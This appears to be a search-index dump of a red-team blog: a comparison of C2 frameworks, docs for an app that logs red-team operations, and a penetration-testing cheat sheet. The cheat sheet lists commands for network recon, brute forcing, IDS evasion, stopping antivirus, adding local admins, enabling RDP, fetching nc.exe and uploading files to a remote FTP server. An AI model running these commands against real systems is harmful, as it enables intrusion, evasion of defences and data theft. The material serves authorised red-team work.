Pros: PowerShell Based on Metasploit (need MSF for full use) Easily track domain users vs admins Cons: Windows Only PowerShell Limited maintenance Limited review Requires cleartext creds for sessions or tokens (no keys/PTH/Kerb/etc) Base flags AV","title":"Koadic"},{"location":"blogs/2019/c2-agent-comparison/#merlin","text":"Code: https://github.com/Ne0nd0g/merlin License: GNU GPL3 Pros: Cross Platform Extensible HTTP/2 Metasploit Similarities Leverages multiple known proven modules Cons: Buggy Limited review Requires binaries/file loads to disk Limited capability for mem resident (recompile is buggy) No native AV obfuscation Significant dll mods to avoid AV","title":"Merlin"},{"location":"blogs/2019/c2-agent-comparison/#pinjectra","text":"Code: https://github.com/SafeBreach-Labs/pinjectra License: BSD3 Pros: TBD Cons: Not C2 TBD","title":"Pinjectra"},{"location":"blogs/2019/c2-agent-comparison/#poshc2","text":"Code: https://github.com/nettitude/PoshC2_Python License: BSD3 Pros: PowerShell Python Cross Platform Metasploit Styled Config controls all settings Cons: Disk based No native AV obfuscation Payloads generated at server instantiation Single user console (additional consoles requires hole in fw for access unless on common port i.e. those you want for OPS) Separate server and console screens","title":"PoshC2"},{"location":"blogs/2019/c2-agent-comparison/#sliver","text":"Code: https://github.com/BishopFox/sliver License: GNU GPL3 Pros: Crossplatform Anit-forensics (? Untested) Attempts to enforce good OPSEC Agents will reconnect if proc crash (within given timeframe) Agent info provided during profile generation Stable so far (no unvalidated crashes) Did not produce any alerts Native builds did not flag AV (Defender, CrowdStrike, Tanium. McAfee) Cons: In Alpha Limited review Limited capabilities Generating with symbols takes a while (requires additional memory on server) Proc crashes if memory overrun (need several GB for generation) Generating without symbols is fast but is less obfuscated Cannot change callback timing Nearly interactive No logging Last check-in was not accurate in testing","title":"Sliver"},{"location":"blogs/2019/c2-agent-comparison/#silenttrinity","text":"Code: https://github.com/byt3bl33d3r/SILENTTRINITY License: GNU GPL3 Pros: Crossplatform Collaborative All actions logged Recently rewritten Cons: Recently rewritten HTTP/1.1 Limited review","title":"Silenttrinity"},{"location":"blogs/2019/c2-agent-comparison/#trevorc2","text":"Code: https://github.com/trustedsec/trevorc2 License: WTH Pros: Does not use POST for exfil Mirrors chosen site for use Simple Interface Traffic looks like legit web (b64 to initial viewing) Can be used across platforms Alternates callback intervals Notes indicate future dev Cons: Extremely limited Console has limited native functionality Looks like a project idea that hasn't taken off quite yet","title":"TrevorC2"},{"location":"blogs/2019/c2-agent-comparison/#results","text":"Of the 12 C2 listed, none are viable for my needs in long-term operations. Several have benefits for short-term OPS; however, drawbacks must be weighed against operational objectives. Cobalt Strike is extremely useful and viable for Windows based operations or if used in conjunction with a second C2. If 2 were required outside Cobalt Strike, Sliver would be my first and Faction second choices with very specific use cases for each.","title":"Results"},{"location":"blogs/2019/event-data-collector/","text":"EVENT DATA COLLECTOR (EDC) \u00b6 James Tubberville | November 12, 2019 | Tweet This Post: Event Data Collector (EDC) is a very basic django application used to capture data on the fly. It is primarily designed to facilitate the flow of a cohesive red team by enabling both manual and automated collection of operational activities and information. It's not fancy, was designed in stages to meet the need of the hour, and has had some elements removed to protect multiple organizations. It is expected only RT members assigned to the operation and those designated as Trusted Agents (TA), White Cell, or Control Cell members with a need-to-know will use EDC. You can find all the info, code, and setup instructions on Github . General Information \u00b6 Views \u00b6 Views are based off templates rather than builds. This enables the team to choose what is displayed in the view and what requires viewing the entry detail. Info (info): Information about the event OPLOG (oplogs) Operator Logs - Log entries of all actions Targets (targets): Actioned Targets - Any target asset where actions are performed (succeed or fail) Credentials (creds): Obtained Target Credentials - files, mimikatz, keylogging, etc. Payloads (payloads): Location for storing pre-made payloads (escalation, c2, peristance, etc.) Deconfliction (decon): Deconfliction Data - Basic data! Defensive elements (Blue Teams, SOC, etc.) side should provide more data for verified deconfliction. Note decon is just a subset of oplog data. Examples: Full oplog view oplog command and output Targets View Credentials View Payloads Deconfliction URLs \u00b6 info/ oplogs/ targets/ creds/ payloads/ decon/ tag/ - quick identification of tagged logs (tag/c2, tag/observation, tag/persistence) user/ - list of logs per operator (user/testerld) rta/ - Admin Dashboard (change this as desired) Rest Framework \u00b6 (Requires IsStaff for access) eventinfo/ oplog/ cred/ target/ api-token/ < Generate Key Authentication and Authorization \u00b6 EDC requires an account to be assigned a role for any access. Although individual permissions can be applied, it is highly recommended to use the role based permissions. Roles (Groups) \u00b6 Lead: Event lead or manager - Has privileges to all edc actions Operator: Operator or keyboarder - Has privileges to most edc actions less some permanent delete WhiteCell: Has only view privileges for Info and Deconfliction - Trusted Agent, Observer, Data Scientist, etc. Role Permissions \u00b6 Permission Lead Operator WhiteCell add cred x x - view cred x x - change cred x x - delete cred x x - add eventinfo x x - view eventinfo x x x change eventinfo x x - delete eventinfo x - - add oplog x x - view oplog x x - change oplog x x - delete oplog x x - add payload x x - view payload x x - change payload x x - delete payload x x - add target x x - view target x x - change target x x - delete target x x - add decon x x - view decon x x x change decon x x - delete decon x x - Accounts \u00b6 It is recommended to create new accounts and remove the examples once functionality of new are confirmed. Username Password Role edcadmin admin pass1 Superuser (Admin Dash) testerld user passld Lead Role testerop user passwc Operator tester1 user pass1 Operator tester2 user pass2 Operator testerwc user passwc WhiteCell Account Permissions \u00b6 User Role Info Oplog Targets Creds Payload Deconfliction edcadmin Super RWD RWD RWD RWD RWD RWD testerld lead RWD RWD RWD RWD RWD RWD testerop operator RW RWD RWD RWD RWD RW tester1 operator RW RWD RWD RWD RWD RW tester2 operator RW RWD RWD RWD RWD RW testerwc whitecell R - - - - R 2FA \u00b6 All accounts have the option for 2FA (Authenticator App). Each account will need to enable 2FA via profile. Consolidated Security Information \u00b6 Permission Based Roles (Groups) Login Required (Decorators or Mixins) Permission Required (Decorator or Mixins) Role Based Accounts Lead Operator White Cell Individual Accounts (no group or shared accounts) Multi-Factor Authentication 2FA Token Protections SSL/TLS (Communication Transport) Click Jacking Protection Cross Site Request Forgery Protection Cross Site Scripting Protection Host Header Validation Sessions Security SQL Injection Protection User uploaded content Profile limited to images All users can change respective profiles All other forms allow any file type Allows collection of various file types and interesting information Enables bypass of some XSS and CSRF protections (stored - file) Limited to only Leads and Operators (should be Trusted Users) Drive or volume encryption recommended (DAR) Quick Tips \u00b6 Tags can be any desired keyword useful to your team. These can be used to create a quick view for your desired case (i.e. identify all tagged findings) User tokens must be passed for access to the rest framework. All views have an associated template (vs. a tables build). Adding or removing fields from view is a simple as adding/removing from the template. Some secrets are hidden from view (i.e. the plaintext password is hidden on the creds table but visible in details) Setup instructions on github provides AWS S3 and Email Password Reset options Anyone can register (assuming it is actually open and avail on www) There are no permissions assigned by default. Login produces no views and no access The deployment should have restricted access (ACL), or be accessible only from VPN, etc. You may optionally restrict registrations to a specific email domain The bashrc is recommended for use as it saves terminal logs locally. It also has several simple example functions for submitting data to EDC. These bash examples should be binaries or python execs (client) in your path. The included functions accepts (or if omitted prompts for) entry data, appropriately names and captures a screenshot (if oplog), and submits the entry. Use \u00b6 Manual entry Use the provided forms bash_functions (see github repo) 1 2 3 log - h cred - h target - h API (curl examples) 1 2 3 4 5 6 7 8 # Obtain token curl - d 'username=testerld&password=user passld' https : // domain . com / api - token / # Pull all oplogs ( or / cred / or / target / ) curl https : // domain . com / oplog / - H 'Authorization: Token 333...de8' # Post a new log entry curl - d 'src_host=attackimage2&src_ip=44.33.22.11&dst_host=corpwks01&dst_ip=143.144.145.146&dst_port=445&tool=terminal&description=smb_relay&result=success&operator_id=9' https : // domain . com / oplog / - H 'Authorization: Token 333...de8'","title":"Event Data Collector"},{"location":"blogs/2019/event-data-collector/#event-data-collector-edc","text":"James Tubberville | November 12, 2019 | Tweet This Post: Event Data Collector (EDC) is a very basic django application used to capture data on the fly. It is primarily designed to facilitate the flow of a cohesive red team by enabling both manual and automated collection of operational activities and information. It's not fancy, was designed in stages to meet the need of the hour, and has had some elements removed to protect multiple organizations. It is expected only RT members assigned to the operation and those designated as Trusted Agents (TA), White Cell, or Control Cell members with a need-to-know will use EDC. You can find all the info, code, and setup instructions on Github .","title":"EVENT DATA COLLECTOR (EDC)"},{"location":"blogs/2019/event-data-collector/#general-information","text":"","title":"General Information"},{"location":"blogs/2019/event-data-collector/#views","text":"Views are based off templates rather than builds. This enables the team to choose what is displayed in the view and what requires viewing the entry detail. Info (info): Information about the event OPLOG (oplogs) Operator Logs - Log entries of all actions Targets (targets): Actioned Targets - Any target asset where actions are performed (succeed or fail) Credentials (creds): Obtained Target Credentials - files, mimikatz, keylogging, etc. Payloads (payloads): Location for storing pre-made payloads (escalation, c2, peristance, etc.) Deconfliction (decon): Deconfliction Data - Basic data! Defensive elements (Blue Teams, SOC, etc.) side should provide more data for verified deconfliction. Note decon is just a subset of oplog data. Examples: Full oplog view oplog command and output Targets View Credentials View Payloads Deconfliction","title":"Views"},{"location":"blogs/2019/event-data-collector/#urls","text":"info/ oplogs/ targets/ creds/ payloads/ decon/ tag/ - quick identification of tagged logs (tag/c2, tag/observation, tag/persistence) user/ - list of logs per operator (user/testerld) rta/ - Admin Dashboard (change this as desired)","title":"URLs"},{"location":"blogs/2019/event-data-collector/#rest-framework","text":"(Requires IsStaff for access) eventinfo/ oplog/ cred/ target/ api-token/ < Generate Key","title":"Rest Framework"},{"location":"blogs/2019/event-data-collector/#authentication-and-authorization","text":"EDC requires an account to be assigned a role for any access. Although individual permissions can be applied, it is highly recommended to use the role based permissions.","title":"Authentication and Authorization"},{"location":"blogs/2019/event-data-collector/#roles-groups","text":"Lead: Event lead or manager - Has privileges to all edc actions Operator: Operator or keyboarder - Has privileges to most edc actions less some permanent delete WhiteCell: Has only view privileges for Info and Deconfliction - Trusted Agent, Observer, Data Scientist, etc.","title":"Roles (Groups)"},{"location":"blogs/2019/event-data-collector/#role-permissions","text":"Permission Lead Operator WhiteCell add cred x x - view cred x x - change cred x x - delete cred x x - add eventinfo x x - view eventinfo x x x change eventinfo x x - delete eventinfo x - - add oplog x x - view oplog x x - change oplog x x - delete oplog x x - add payload x x - view payload x x - change payload x x - delete payload x x - add target x x - view target x x - change target x x - delete target x x - add decon x x - view decon x x x change decon x x - delete decon x x -","title":"Role Permissions"},{"location":"blogs/2019/event-data-collector/#accounts","text":"It is recommended to create new accounts and remove the examples once functionality of new are confirmed. Username Password Role edcadmin admin pass1 Superuser (Admin Dash) testerld user passld Lead Role testerop user passwc Operator tester1 user pass1 Operator tester2 user pass2 Operator testerwc user passwc WhiteCell","title":"Accounts"},{"location":"blogs/2019/event-data-collector/#account-permissions","text":"User Role Info Oplog Targets Creds Payload Deconfliction edcadmin Super RWD RWD RWD RWD RWD RWD testerld lead RWD RWD RWD RWD RWD RWD testerop operator RW RWD RWD RWD RWD RW tester1 operator RW RWD RWD RWD RWD RW tester2 operator RW RWD RWD RWD RWD RW testerwc whitecell R - - - - R","title":"Account Permissions"},{"location":"blogs/2019/event-data-collector/#2fa","text":"All accounts have the option for 2FA (Authenticator App). Each account will need to enable 2FA via profile.","title":"2FA"},{"location":"blogs/2019/event-data-collector/#consolidated-security-information","text":"Permission Based Roles (Groups) Login Required (Decorators or Mixins) Permission Required (Decorator or Mixins) Role Based Accounts Lead Operator White Cell Individual Accounts (no group or shared accounts) Multi-Factor Authentication 2FA Token Protections SSL/TLS (Communication Transport) Click Jacking Protection Cross Site Request Forgery Protection Cross Site Scripting Protection Host Header Validation Sessions Security SQL Injection Protection User uploaded content Profile limited to images All users can change respective profiles All other forms allow any file type Allows collection of various file types and interesting information Enables bypass of some XSS and CSRF protections (stored - file) Limited to only Leads and Operators (should be Trusted Users) Drive or volume encryption recommended (DAR)","title":"Consolidated Security Information"},{"location":"blogs/2019/event-data-collector/#quick-tips","text":"Tags can be any desired keyword useful to your team. These can be used to create a quick view for your desired case (i.e. identify all tagged findings) User tokens must be passed for access to the rest framework. All views have an associated template (vs. a tables build). Adding or removing fields from view is a simple as adding/removing from the template. Some secrets are hidden from view (i.e. the plaintext password is hidden on the creds table but visible in details) Setup instructions on github provides AWS S3 and Email Password Reset options Anyone can register (assuming it is actually open and avail on www) There are no permissions assigned by default. Login produces no views and no access The deployment should have restricted access (ACL), or be accessible only from VPN, etc. You may optionally restrict registrations to a specific email domain The bashrc is recommended for use as it saves terminal logs locally. It also has several simple example functions for submitting data to EDC. These bash examples should be binaries or python execs (client) in your path. The included functions accepts (or if omitted prompts for) entry data, appropriately names and captures a screenshot (if oplog), and submits the entry.","title":"Quick Tips"},{"location":"blogs/2019/event-data-collector/#use","text":"Manual entry Use the provided forms bash_functions (see github repo) 1 2 3 log - h cred - h target - h API (curl examples) 1 2 3 4 5 6 7 8 # Obtain token curl - d 'username=testerld&password=user passld' https : // domain . com / api - token / # Pull all oplogs ( or / cred / or / target / ) curl https : // domain . com / oplog / - H 'Authorization: Token 333...de8' # Post a new log entry curl - d 'src_host=attackimage2&src_ip=44.33.22.11&dst_host=corpwks01&dst_ip=143.144.145.146&dst_port=445&tool=terminal&description=smb_relay&result=success&operator_id=9' https : // domain . com / oplog / - H 'Authorization: Token 333...de8'","title":"Use"},{"location":"blogs/2019/git-clone-entire-org/","text":"Clone all repos \u00b6 James Tubberville | March 13, 2019 | Tweet This Post: This is a short form post resulting from conversations over single line cloning and/or pulling of all organizational repos. In short, I once needed a quick and easy bash method for pulling all repos under an organizational tree. The following three one-liners were used (and have been used many times since). I regularly use the last to pull all repos before beginning any additions or mods to ThreatExpress. As usual, you can find the raw script and get the latest version of tools on our GitHub repository: https://github.com/threatexpress . Clone all public repos 1 for line in $ ( curl https : // api . github . com / orgs / threatexpress / repos | grep - o \" git@github.com:threatexpress/[^ ,\\ \" ]\\ + \" );do echo git clone $line;done Clone private repos as well 1 for line in $ ( curl https : // api . github . com / orgs / threatexpress / repos ? access_token =< EnterTokenHere > | grep - o \" git@github.com:threatexpress/[^ ,\\ \" ]\\ + \" );do git clone $line;done Note Generate your personal access token in your github profile > Developer Settings > Personal Access Tokens Pull all repos within a hierarchical folder structure 1 find . - type d - depth 1 - exec git -- git - dir = {} / . git -- work - tree = $ PWD / {} pull \\ ; Note I store all repos within organizational folders in a designated location. Change depth to accommodate your structure","title":"Git clone all organizational repos"},{"location":"blogs/2019/git-clone-entire-org/#clone-all-repos","text":"James Tubberville | March 13, 2019 | Tweet This Post: This is a short form post resulting from conversations over single line cloning and/or pulling of all organizational repos. In short, I once needed a quick and easy bash method for pulling all repos under an organizational tree. The following three one-liners were used (and have been used many times since). I regularly use the last to pull all repos before beginning any additions or mods to ThreatExpress. As usual, you can find the raw script and get the latest version of tools on our GitHub repository: https://github.com/threatexpress . Clone all public repos 1 for line in $ ( curl https : // api . github . com / orgs / threatexpress / repos | grep - o \" git@github.com:threatexpress/[^ ,\\ \" ]\\ + \" );do echo git clone $line;done Clone private repos as well 1 for line in $ ( curl https : // api . github . com / orgs / threatexpress / repos ? access_token =< EnterTokenHere > | grep - o \" git@github.com:threatexpress/[^ ,\\ \" ]\\ + \" );do git clone $line;done Note Generate your personal access token in your github profile > Developer Settings > Personal Access Tokens Pull all repos within a hierarchical folder structure 1 find . - type d - depth 1 - exec git -- git - dir = {} / . git -- work - tree = $ PWD / {} pull \\ ; Note I store all repos within organizational folders in a designated location. Change depth to accommodate your structure","title":"Clone all repos"},{"location":"blogs/2019/penetration-testing-pasties/","text":"Penetration Testing Pasties \u00b6 James Tubberville | January 11, 2019 | Tweet This Post: 'Pasties' started as a small file used to collect random bits of information and scripts that were common to many individual tests. Most of this is just a consolidation of publicly available information and things that Joe Vest ( @joevest ), Andrew Chiles ( @andrewchiles ), Derek Rushing, or myself ( @minis_io ) have found useful. Over time additional sections, section placeholders, snippets, and links were added for \"quick reference\" and has grown to quite a sizable markdown file. The more complex or longer sections will be separated into smaller more detailed write-ups; however, we decided to drop the short and generic info for public use now. Pasties data will also eventually be formatted and added to the wiki. As usual, you can find an updated version of pasties (and other tools) on GitHub: https://github.com/threatexpress . Penetration Testing Framework http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html Penetration Testing Execution Standard http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines Good writeup on passive information gathering http://www.securitysift.com/passive-reconnaissance/ Password Breach Database, requires subscription https://leakbase.pw/ FOCA \u00b6 Maltego \u00b6 ReconNG \u00b6 Metagoofil \u00b6 Source: http://resources.infosecinstitute.com/kali-reporting-tools/#gref Metagoofil is an information gathering tool designed for extracting metadata of public documents (pdf,doc,xls,ppt,docx,pptx,xlsx) related to a target domain. It can give a lot of important information by scanning the obtained files. It can generate an HTML page with the result of the metadata extracted, plus a list of potential usernames, very useful for preparing a brute force attack on open services like ftp, web application, VPN, pop3, etc. Metagoofil performs the following: Searches the given file type using the Google search engine Downloads all the documents found Extracts metadata from downloaded documents Saves the result in HTML file Perform document metadata searching on target domain using first 200 google results 1 metagoofil - d < target > . com - t pdf , doc , xls , ppt , odp , ods , docx , xlsx , pptx - l 200 - n 5 - o / tmp / metagoofil / - f / tmp / metagoofil / result . html censys.io \u00b6 Censys is a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet. Driven by Internet-wide scanning, Censys lets researchers find specific hosts and create aggregate reports on how devices, websites, and certificates are configured and deployed. Create an account and get an API key for use in ReconNG or manual searching https://censys.io/ipv4?q= Python API 1 2 3 4 5 6 7 8 9 10 # pip install censys import censys.ipv4 c = censys . ipv4 . CensysIPv4 ( api_id = \"Get from MyAccount at censys.io\" , api_secret = \"Get from MyAccount at censys.io\" ) ranges = [ \"X.X.X.0/24\" , \"X.X.X.0/24\" , \"X.X.X.0/24\" ] for range in ranges : results = c . search ( range ) for result in results : for port in result [ \"protocols\" ]: print result [ \"ip\" ] + \",\" + port Network Scanning \u00b6 dsnrecon \u00b6 Normal dns reverse lookup of IP range with CSV output 1 dnsrecon - t rvl - r 1 . 2 . 3 . 4 / 24 - c output . csv Perform default enumeration of a domain 1 dnsrecon - d < domain > Perform zone transfer attempt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 dnsrecon - t axfr - d < domain > \u2570 $ dnsrecon - h Version : 0 . 8 . 10 Usage : dnsrecon . py < options > Options : - h , -- help Show this help message and exit . - d , -- domain < domain > Target domain . - r , -- range < range > IP range for reverse lookup brute force in formats ( first - last ) or in ( range / bitmask ) . - n , -- name_server < name > Domain server to use . If none is given , the SOA of the target will be used . - D , -- dictionary < file > Dictionary file of subdomain and hostnames to use for brute force . - f Filter out of brute force domain lookup , records that resolve to the wildcard defined IP address when saving records . - t , -- type < types > Type of enumeration to perform : std SOA , NS , A , AAAA , MX and SRV if AXRF on the NS servers fail . rvl Reverse lookup of a given CIDR or IP range . brt Brute force domains and hosts using a given dictionary . srv SRV records . axfr Test all NS servers for a zone transfer . goo Perform Google search for subdomains and hosts . snoop Perform cache snooping against all NS servers for a given domain , testing all with file containing the domains , file given with - D option . tld Remove the TLD of given domain and test against all TLDs registered in IANA . zonewalk Perform a DNSSEC zone walk using NSEC records . - a Perform AXFR with standard enumeration . - s Perform a reverse lookup of IPv4 ranges in the SPF record with standard enumeration . - g Perform Google enumeration with standard enumeration . - w Perform deep whois record analysis and reverse lookup of IP ranges found through Whois when doing a standard enumeration . - z Performs a DNSSEC zone walk with standard enumeration . -- threads < number > Number of threads to use in reverse lookups , forward lookups , brute force and SRV record enumeration . -- lifetime < number > Time to wait for a server to response to a query . -- db < file > SQLite 3 file to save found records . -- xml < file > XML file to save found records . -- iw Continue brute forcing a domain even if a wildcard records are discovered . - c , -- csv < file > Comma separated value file . - j , -- json < file > JSON file . - v Show attempts in the brute force modes . TheHarvester \u00b6 Perform lookup against with additional DNS reverse on all ranges discovered 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 theharvester - d < domain > - c - n - b google - l 1000 [ - f output ] Usage : theharvester options - d : Domain to search or company name - b : data source : google , googleCSE , bing , bingapi , pgp linkedin , google - profiles , people123 , jigsaw , twitter , googleplus , all - s : Start in result number X ( default : 0 ) - v : Verify host name via dns resolution and search for virtual hosts - f : Save the results into an HTML and XML file - n : Perform a DNS reverse query on all ranges discovered - c : Perform a DNS brute force for the domain name - t : Perform a DNS TLD expansion discovery - e : Use this DNS server - l : Limit the number of results to work with ( bing goes from 50 to 50 results , - h : use SHODAN database to query discovered hosts google 100 to 100 , and pgp doesn ' t use this option) Examples : theharvester - d microsoft . com - l 500 - b google theharvester - d microsoft . com - b pgp theharvester - d microsoft - l 200 - b linkedin theharvester - d apple . com - b googleCSE - l 500 - s 300 Nmap \u00b6 https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/OpsPlan2016.txt Host discovery 1 2 3 4 nmap - sn - n < targets > nmap - A < host > ( run this second ) nmap - sV - F nmap - p - - sV - O - T4 - v7 - sC Open SMB shares 1 nmap --script=smb-enum-shares -p445 Open NFS Shares 1 nmap - p 111 , 2049 --script nfs-ls,nfs-showmount UDP scan: 1 nmap - sU - F - Pn - v - d - sC - sV --open --reason -T5 <targets> Anonymous FTP 1 2 nmap - sC - sV - p21 nmap - sV - n - sS - Pn - vv --open -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 <targets> VNC Brute 1 nmap --script=vnc-brute -p5800,5900 Rawr Scan 1 nmap - sV --open -T4 -v7 -p80,280,443,591,593,981,1311,2031,2480,3181,4444,4445,4567,4711,4712,5104,5280,5800,5988,5989,7000,7001,7002,8008,8011,8012,8013,8014,8042,8069,8080,8081,8243,8280,8281,8531,8887,8888,9080,9443,11371,12443,16080,18091,18092 -iL live-hosts.txt -oA web MSSQL Scan 1 nmap - vv - sV - Pn - n - p1433 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=1433,smsql.username-sa,mssql.password-sa <targets> -oA <outfile> HTTP Scan 1 nmap - vv - sS - Pn - n - p80 , 443 , 8080 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-email-harvest,http-methods,http-method-tamper,http-passwd,http-robots.txt <targets> -oA <outfile> IDS Evasion \u00b6 Append extra random data to change default packet lengths 1 \u2013 data - length 15 Randomize scan order 1 - randomize - hosts Web \u00b6 Eyewitness \u00b6 Get the most recent version 1 git clone https : // github . com / ChrisTruncer / EyeWitness . git Faster Scan 1 . / EyeWitness . py --web -f hosts.txt --timeout 5 --threads 10 -d /mnt/event/Recon/ew --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https Slow version via proxychains 1 2 3 proxychains . / EyeWitness . py --web -f hosts.txt --timeout 10 --threads 2 -d /mnt/event/Recon/ew --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https proxychains . / EyeWitness . py --web -x nmaphosts.xml --timeout 10 --threads 2 -d /mnt/event/Recon/ew2 --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https Proxychains specify a remote DNS server http://carnal0wnage.attackresearch.com/2013/09/changing-proxychains-hardcoded-dns.html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 On Kali linux its found here : / usr / lib / proxychains3 / proxyresolv # !/ bin / sh # This script is called by proxychains to resolve DNS names # DNS server used to resolve names DNS_SERVER = 4 . 2 . 2 . 2 if [ $# = 0 ] ; then echo \" usage: \" echo \" proxyresolv <hostname> \" exit fi export LD_PRELOAD = libproxychains . so . 3 dig $1 @ $D NS_SERVER + tcp | awk ' /A.+[0-9]+\\.[0-9]+\\.[0-9]/{print $5;} ' Use Canary tokens to identify web front-end vulnerabilities In combination with Burp collaborator, identify configuration issues with web front-end appliances For example, issue request to target domain with a custom Host header pointing to your collaborator/canary: Request: 1 2 3 GET / HTTP / 1 . 1 Host : uniqid . burpcollaborator . net Connection : close Response (on Collaborator): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 GET / HTTP / 1 . 1 Host : XX . X . XXX . XX : 8082 HTTP / 1 . 1 200 Connection Established Date : Tue , 07 Feb 2017 16 : 32 : 50 GMT Transfer - Encoding : chunked Connection : close Ok / HTTP / 1 . 1 is unavailable Ok Unknown Command Ok Unknown Command Ok Unknown Command Ok Canarytokens.org Blog - Targeting HTTP's Hidden Attack Surface Windows \u00b6 Built-in Commands \u00b6 View your current user: 1 whoami View information about the current user: 1 2 net user myuser ( for a local user ) net user myuser / domain ( for a domain user ) View the local groups: 1 net localgroup View the local administrators: 1 net localgroup Administrators Add a new user: 1 net user myuser mypass / add Add a user in the local Administrators group: 1 net localgroup Administrators myuser / add View the domain name of current machine: 1 2 net config workstation net config server View the name of the domain controller: 1 reg query \"HKEY_LOCAL_MACHINE\\ SOFTWARE\\Microsoft\\Windows\\ CurrentVersion\\Group Policy\\ History\" / v DCName or 1 Import - Module ActiveDirectory ; ( Get - ADDomainController - DomainName corp . test . com - Discover - NextClosestSite ). HostName or 1 set l Get list of DCs 1 nltest / dclist : domainname or 1 netdom query / D : domin DC or 1 dsquery server or 1 nslookup - type = srv _ldap . _tcp . dc . _msdcs . corp . test . com Get DC Info 1 nltest / dsgetdc : domain Get DC site mapping 1 nltest / dsaddresstosite : dcname . corp . test . com Get PDC 1 netdom query / D : domain PDC or 1 nslookup - type = srv _ldap . _tcp . pdc . _msdcs . corp . test . com or get roles Get Roles 1 netdom query / D : domain FSMO List trusts 1 nltest / domain_trust or 1 nltest / trusted_domains or 1 get - adtrust - Filter * Get DC for Trusted Domains 1 $ t = Get - AdTrust - Filter * | Select - expandproperty Name ; foreach ( $ line in $ t ) { nltest / dclist : $ line } View the list of domain users: 1 2 3 4 C : \\ > wmic useraccount where ( domain = '%USERDOMAIN%' ) get Name > userlist . txt PS C : \\ > ( [ adsisearcher ] \"objectCategory=User\" ). Findall () | ForEach {$ _ . properties . samaccountname } | Sort | Out - File - Encoding ASCII users . txt or 1 net user / domain Get domain info (including DC) 1 gpresult / z View the list of domain admins: 1 net group \"Domain Admins\" / domain View domain groups 1 2 net group / domain powershell ( new - object system . directoryservices . directorysearcher ( \"(&(objectcategory=user)(samaccountname=$($env:username)))\" )). FindOne (). GetDirectoryEntry (). memberof View the list of started services (search for antivirus): 1 2 net start sc query Stop a service: 1 net stop \"Symantec Endpoint Protection\" View the list of started processes and the owner: 1 tasklist / v Kill a process by its name: 1 taskkill / F / IM \"cmd.exe\" Abort a shutdown/restart countdown: 1 shutdown / a Download an executable from a remote FTP server: 1 2 3 4 5 6 echo open 10 . 1 . 2 . 3 > C : \\ script . txt echo user myftpuser >> C : \\ script . txt echo pass myftppass >> C : \\ script . txt echo get nc . exe >> C : \\ script . txt echo bye >> C : \\ script . txt ftp - s : script . txt Upload a file to a remote FTP server: 1 2 3 4 5 6 echo open 10 . 1 . 2 . 3 > C : \\ script . txt echo user myftpuser >> C : \\ script . txt echo pass myftppass >> C : \\ script . txt echo put E : \\ backups \\ database . dbf >> C : \\ script . txt echo bye >> C : \\ script . txt ftp - s : script . txt WMI call remote system 1 wmic / node : remote_computer process call create \"netstat.exe -ano > C:\\output.txt\" WMI get startup items 1 wmic startup get Caption , Command , User or 1 wmic startup list full WMI get enabled account password expiration 1 wmic useraccount where \"disabled=0 AND localaccount=1\" get name , passwordexpires / value View established connections of current machine: 1 netstat - a - n - p tcp | find \"ESTAB\" View open ports of current machine: 1 netstat - a - n - p tcp | find \"LISTEN\" 1 netstat - a - n - p udp View network configuration: 1 2 3 netsh interface ip show addresses netsh interface ip show route netsh interface ip show neighbors View current network shares: 1 net share Mount a remote share with the rights of the current user: 1 net use K : \\\\ 10 . 1 . 2 . 3 \\ C $ Enable Remote Desktop: 1 reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" / v fDenyTSConnections / t REG_DWORD / d 0 / f One-Liner Windows Enumeration Reference: https://gist.github.com/KyleHanslovan/cadf9737401b85422c84091855473eb7 1 whoami & hostname & ipconfig / all & net user / domain 2 >& 1 & net group / domain 2 >& 1 & net group \"domain admins\" / domain 2 >& 1 & net group \"Exchange Trusted Subsystem\" / domain 2 >& 1 & net accounts / domain 2 >& 1 & net user 2 >& 1 & net localgroup administrators 2 >& 1 & netstat - an 2 >& 1 & tasklist 2 >& 1 & sc query 2 >& 1 & systeminfo 2 >& 1 & reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" 2 >& 1 & net view & net view / domain & net user % USERNAME % / domain & nltest / dclist & gpresult / z Check for unquoted service paths 1 wmic service get name , displayname , pathname , startmode | findstr / i / v \"c:\\windows\\\\\" | findstr / i / v \"\" \" or 1 gwmi win32_service | Select pathname | Where { ( $ _ . pathname - ne $ null ) } | Where { - not $ _ . pathname . StartsWith ( \"`\"\")} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(\" . \") +4)) -match \" . * . * \"} Change Windows Proxy Settings 1 2 3 4 5 6 7 8 9 10 11 12 13 Command to enable proxy usage : reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" / v ProxyEnable / t REG_DWORD / d 1 / f Command to disable proxy usage : reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" / v ProxyEnable / t REG_DWORD / d 0 / f Command to change the proxy address : reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" / v ProxyServer / t REG_SZ / d proxyserveraddress : proxyport / f Also , in this case , it is a per - user setting than a system - wide setting . Mount a .win image remotely on target machine 1 2 3 4 5 6 7 8 9 10 Dism / get - wiminfo / wimfile : z : \\ win7 \\ Acme_Win7 . wim Boot Dir Dism / Mount - Wim / WimFile : z : \\ win7 \\ Acme_Win7 . wim / index : 1 / MountDir : C : \\ windows \\ temp 